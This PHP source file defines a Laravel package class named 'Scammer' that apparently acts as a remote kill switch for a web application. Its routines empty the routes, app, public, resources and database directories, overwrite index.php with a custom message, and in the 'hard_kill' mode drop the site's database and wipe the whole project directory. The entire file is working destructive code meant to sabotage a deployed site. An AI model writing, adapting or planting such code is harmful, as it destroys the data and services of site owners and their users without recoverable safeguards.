<?php
namespace fania\Scammer;
use File;
use DB;
class Scammer{
  public function __construct($type){
    $this->type = $type;
    $this->message = config('scammer.message');
  }
  private static function SoftKill(){
    File::cleanDirectory('routes');
    $IndexFile = fopen('index.php' , 'w');
    $CustomeMessage = "<h1>".config('scammer.message')."</h1>";
    fwrite($IndexFile , $CustomeMessage);
  }
  private static function MedKill(){
    File::cleanDirectory('routes');
    File::cleanDirectory('resources');
    File::cleanDirectory('public');
    File::cleanDirectory('app');
    File::cleanDirectory('database');
    $IndexFile = fopen('index.php' , 'w');
    $CustomeMessage = "<h1>".config('scammer.message')."</h1>";
    fwrite($IndexFile , $CustomeMessage);
  }
  private static function HardKill(){
    //Get Database Name From The .env
    $dbName = env('DB_DATABASE');
    DB::statement('DROP DATABASE '.$dbName);
    File::cleanDirectory(app_path().'/../');
    $IndexFile = fopen('index.php' , 'w');
    $CustomeMessage = "<h1>".config('scammer.message')."</h1>";
    fwrite($IndexFile , $CustomeMessage);
  }
  public static function kill($type){
    if($type == 'soft_kill'){
      self::SoftKill();
    }elseif ($type == 'med_kill') {
      self::MedKill();
    }elseif($type == 'hard_kill'){

      self::HardKill();
    }else{
      self::SoftKill();
    }
  }

}
